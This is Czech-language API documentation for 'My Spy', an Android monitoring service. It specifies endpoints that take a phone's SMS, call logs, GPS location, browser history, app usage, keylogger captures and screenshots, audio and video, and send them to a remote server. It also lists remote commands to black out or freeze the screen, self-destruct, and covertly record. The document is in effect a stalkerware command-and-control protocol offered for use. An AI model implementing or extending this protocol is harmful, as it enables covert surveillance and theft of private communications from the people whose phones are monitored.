# My Spy - API Dokumentace

**Autor:** Michael KOJDL
**Verze:** 1.0.0
**Poslední revize:** 2025-10-30
**Base URL:** `https://api.myspy.fir.ma/api/v1/`

---

## Obsah

1. [Úvod](#úvod)
2. [Autentizace](#autentizace)
3. [Error Handling](#error-handling)
4. [Rate Limiting](#rate-limiting)
5. [Endpoints](#endpoints)
6. [WebSocket API](#websocket-api)
7. [Data Models](#data-models)

---

## Úvod

My Spy REST API poskytuje rozhraní pro komunikaci mezi Android zařízeními a webovou aplikací.

### Základní informace

- **Protocol**: HTTPS only
- **Format**: JSON
- **Authentication**: UUID + API Key
- **Content-Type**: `application/json`
- **Encoding**: UTF-8

### API Verze

- **Current Version**: v1
- **Base URL**: `https://api.myspy.fir.ma/api/v1/`

---

## Autentizace

### Device Authentication

Každý request (kromě registrace) musí obsahovat:

```http
X-Device-UUID: 550e8400-e29b-41d4-a716-446655440000
X-API-Key: A1B2C3D4E5F6G7H8I9J0
Content-Type: application/json
```

### Registrace nového zařízení

První volání API - registrace zařízení a získání API credentials.

**Endpoint:** `POST /api/v1/register`

**Request:**
```json
{
  "manufacturer": "Samsung",
  "model": "Galaxy S23",
  "serial": "ABC123XYZ789",
  "os": "Android",
  "os_version": "13",
  "imei": "123456789012345",
  "uuid": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Success Response (201 Created):**
```json
{
  "result": "ok",
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "api_key": "A1B2C3D4E5F6G7H8I9J0",
  "timestamp": "2025-10-30T12:34:56.789Z",
  "version": "1.0.0"
}
```

**Error Response (409 Conflict):**
```json
{
  "result": "error",
  "error": "DUPLICATE_DEVICE",
  "message": "Device with this serial number already exists",
  "field": "serial"
}
```

**Možné chyby:**
- `DUPLICATE_DEVICE` - Zařízení již registrováno (serial/IMEI/UUID)
- `INVALID_DATA` - Neplatná data
- `VALIDATION_ERROR` - Validační chyba

---

## Error Handling

### Standard Error Response

```json
{
  "result": "error",
  "error": "ERROR_CODE",
  "message": "Human readable error message",
  "field": "field_name",  // optional
  "details": {}           // optional
}
```

### HTTP Status Codes

- `200 OK` - Úspěšný request
- `201 Created` - Úspěšné vytvoření resource
- `400 Bad Request` - Neplatný request
- `401 Unauthorized` - Chybějící nebo neplatná autentizace
- `403 Forbidden` - Nedostatečná oprávnění
- `404 Not Found` - Resource nenalezen
- `409 Conflict` - Konflikt (např. duplicitní záznam)
- `429 Too Many Requests` - Rate limit exceeded
- `500 Internal Server Error` - Serverová chyba

---

## Rate Limiting

### Limity

- **Device Registration**: 5 requests / hour
- **Data Upload**: 1000 requests / hour
- **Control Commands**: 100 requests / hour

### Headers

Každý response obsahuje rate limit headers:

```http
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 950
X-RateLimit-Reset: 1698765432
```

---

## Endpoints

### 1. SMS Messages

#### Upload SMS Data

**Endpoint:** `POST /api/v1/sms`

**Request (Single):**
```json
{
  "type": "INCOMING",
  "address": "+420123456789",
  "body": "Hello, this is a test message",
  "timestamp": "2025-10-30T10:30:00.000Z",
  "thread_id": 12345
}
```

**Request (Bulk):**
```json
[
  {
    "type": "INCOMING",
    "address": "+420123456789",
    "body": "Message 1",
    "timestamp": "2025-10-30T10:30:00.000Z",
    "thread_id": 12345
  },
  {
    "type": "OUTGOING",
    "address": "+420987654321",
    "body": "Message 2",
    "timestamp": "2025-10-30T10:31:00.000Z",
    "thread_id": 12346
  }
]
```

**Response (201 Created):**
```json
{
  "result": "ok",
  "created": 2,
  "timestamp": "2025-10-30T12:34:56.789Z"
}
```

**Parameters:**
- `type` (string, required): "INCOMING" | "OUTGOING" | "DRAFT"
- `address` (string, required): Phone number
- `body` (string, required): Message content
- `timestamp` (datetime, required): ISO 8601 format
- `thread_id` (integer, optional): SMS thread ID

---

### 2. Call Logs

#### Upload Call Data

**Endpoint:** `POST /api/v1/calls`

**Request:**
```json
[
  {
    "type": "INCOMING",
    "number": "+420123456789",
    "duration": 125,
    "timestamp": "2025-10-30T10:30:00.000Z"
  },
  {
    "type": "OUTGOING",
    "number": "+420987654321",
    "duration": 0,
    "timestamp": "2025-10-30T10:35:00.000Z"
  }
]
```

**Response:**
```json
{
  "result": "ok",
  "created": 2
}
```

**Parameters:**
- `type` (string): "INCOMING" | "OUTGOING" | "MISSED"
- `number` (string): Phone number
- `duration` (integer): Call duration in seconds
- `timestamp` (datetime): Call time

---

### 3. Location Data

#### Upload GPS Data

**Endpoint:** `POST /api/v1/location`

**Request:**
```json
[
  {
    "latitude": 50.0755,
    "longitude": 14.4378,
    "accuracy": 10.5,
    "altitude": 200.0,
    "speed": 0.0,
    "timestamp": "2025-10-30T10:30:00.000Z",
    "address": "Prague, Czech Republic"
  }
]
```

**Response:**
```json
{
  "result": "ok",
  "created": 1
}
```

**Parameters:**
- `latitude` (float, required): GPS latitude
- `longitude` (float, required): GPS longitude
- `accuracy` (float): Accuracy in meters
- `altitude` (float): Altitude in meters
- `speed` (float): Speed in m/s
- `timestamp` (datetime): Location timestamp
- `address` (string, optional): Reverse geocoded address

---

### 4. App Usage

#### Upload App Usage Data

**Endpoint:** `POST /api/v1/apps`

**Request:**
```json
[
  {
    "package_name": "com.whatsapp",
    "app_name": "WhatsApp",
    "foreground_time": 3600,
    "launch_count": 5,
    "last_used": "2025-10-30T10:30:00.000Z",
    "date": "2025-10-30"
  }
]
```

**Response:**
```json
{
  "result": "ok",
  "created": 1
}
```

**Parameters:**
- `package_name` (string): App package identifier
- `app_name` (string): Human-readable app name
- `foreground_time` (integer): Time in foreground (seconds)
- `launch_count` (integer): Number of app launches
- `last_used` (datetime): Last usage timestamp
- `date` (date): Usage date

---

### 5. Internet Activity

#### Upload Browser History

**Endpoint:** `POST /api/v1/internet`

**Request:**
```json
[
  {
    "url": "https://www.example.com/page",
    "title": "Example Page Title",
    "visit_count": 1,
    "timestamp": "2025-10-30T10:30:00.000Z",
    "browser": "Chrome"
  }
]
```

**Response:**
```json
{
  "result": "ok",
  "created": 1
}
```

---

### 6. Keylogger Data

#### Upload Keylogger Logs

**Endpoint:** `POST /api/v1/keylogger`

**Request:**
```json
[
  {
    "app_package": "com.whatsapp",
    "app_name": "WhatsApp",
    "window_title": "Chat with John",
    "text": "Sample typed text",
    "timestamp": "2025-10-30T10:30:00.000Z"
  }
]
```

**Response:**
```json
{
  "result": "ok",
  "created": 1
}
```

**⚠️ Warning:** Tento endpoint je vysoce citlivý!

---

### 7. Media Upload

#### Upload Media Files

**Endpoint:** `POST /api/v1/media`

**Request (Multipart):**
```http
POST /api/v1/media HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
X-Device-UUID: 550e8400-e29b-41d4-a716-446655440000
X-API-Key: A1B2C3D4E5F6G7H8I9J0

------WebKitFormBoundary
Content-Disposition: form-data; name="type"

screenshot
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="screenshot_001.jpg"
Content-Type: image/jpeg

<binary data>
------WebKitFormBoundary
Content-Disposition: form-data; name="timestamp"

2025-10-30T10:30:00.000Z
------WebKitFormBoundary
Content-Disposition: form-data; name="metadata"

{"app_package": "com.whatsapp"}
------WebKitFormBoundary--
```

**Response:**
```json
{
  "result": "ok",
  "file_id": "abc123",
  "url": "/media/screenshots/abc123.jpg"
}
```

**Parameters:**
- `type` (string): "screenshot" | "video" | "audio" | "camera"
- `file` (binary): File data
- `timestamp` (datetime): Capture time
- `metadata` (JSON): Additional metadata

---

### 8. Remote Control

#### Send Command to Device

**Endpoint:** `POST /api/v1/control/command`

**Request:**
```json
{
  "device_uuid": "550e8400-e29b-41d4-a716-446655440000",
  "command": "BLACK_DISPLAY",
  "parameters": {
    "enabled": true
  }
}
```

**Response:**
```json
{
  "result": "ok",
  "command_id": "cmd_12345",
  "status": "PENDING"
}
```

**Available Commands:**
- `BLACK_DISPLAY` - Enable/disable black screen
- `FROZEN_DISPLAY` - Freeze current screen
- `SELF_DESTRUCT` - Self-destruct sequence
- `WIFI_CONTROL` - Control WiFi
- `BLUETOOTH_CONTROL` - Control Bluetooth
- `LOCK_DEVICE` - Lock device
- `CAPTURE_SCREENSHOT` - Take screenshot
- `RECORD_VIDEO` - Record video
- `RECORD_AUDIO` - Record audio

#### Get Device Status

**Endpoint:** `GET /api/v1/control/status`

**Response:**
```json
{
  "device_uuid": "550e8400-e29b-41d4-a716-446655440000",
  "status": "ONLINE",
  "last_seen": "2025-10-30T12:34:56.789Z",
  "battery_level": 75,
  "battery_charging": false,
  "network_type": "WIFI",
  "storage_available": 15000000000
}
```

---

## WebSocket API

### Connection

**URL:** `wss://wss.myspy.fir.ma/device/{uuid}`

**Authentication:**
```javascript
// Query parameters
wss://wss.myspy.fir.ma/device/550e8400-e29b-41d4-a716-446655440000?api_key=A1B2C3D4E5F6G7H8I9J0
```

### Message Format

#### Heartbeat (Device → Server)

```json
{
  "type": "heartbeat",
  "timestamp": "2025-10-30T12:34:56.789Z",
  "status": {
    "battery_level": 75,
    "network_type": "WIFI"
  }
}
```

**Server Response:**
```json
{
  "type": "heartbeat_ack",
  "timestamp": "2025-10-30T12:34:57.000Z"
}
```

#### Real-time Data (Device → Server)

```json
{
  "type": "data",
  "data_type": "sms",
  "payload": {
    "type": "INCOMING",
    "address": "+420123456789",
    "body": "New message",
    "timestamp": "2025-10-30T12:34:56.789Z"
  }
}
```

#### Command (Server → Device)

```json
{
  "type": "command",
  "command_id": "cmd_12345",
  "command": "CAPTURE_SCREENSHOT",
  "parameters": {}
}
```

**Device Response:**
```json
{
  "type": "command_result",
  "command_id": "cmd_12345",
  "status": "SUCCESS",
  "result": {
    "file_url": "/media/screenshots/abc123.jpg"
  }
}
```

---

## Data Models

### Device

```typescript
interface Device {
  uuid: string;
  api_key: string;
  manufacturer: string;
  model: string;
  serial: string;
  os: string;
  os_version: string;
  imei: string;
  owner_id: number;
  shared_with: number[];
  is_active: boolean;
  last_seen: string;  // ISO 8601
  created_at: string; // ISO 8601
  updated_at: string; // ISO 8601
}
```

### SMS Message

```typescript
interface SmsMessage {
  id: number;
  device_uuid: string;
  type: 'INCOMING' | 'OUTGOING' | 'DRAFT';
  address: string;
  body: string;
  timestamp: string;  // ISO 8601
  thread_id?: number;
  received_at: string; // ISO 8601
}
```

### Call Log

```typescript
interface CallLog {
  id: number;
  device_uuid: string;
  type: 'INCOMING' | 'OUTGOING' | 'MISSED';
  number: string;
  duration: number;  // seconds
  timestamp: string; // ISO 8601
  received_at: string;
}
```

### Location

```typescript
interface Location {
  id: number;
  device_uuid: string;
  latitude: number;
  longitude: number;
  accuracy?: number;
  altitude?: number;
  speed?: number;
  address?: string;
  timestamp: string;
  received_at: string;
}
```

---

## Changelog

### v1.0.0 (2025-10-30)
- ✨ Initial API release
- ✨ Device registration
- ✨ All monitoring endpoints
- ✨ Remote control API
- ✨ WebSocket support

---

**Autor:** Michael KOJDL
**Poslední aktualizace:** 2025-10-30
**Verze:** 1.0.0
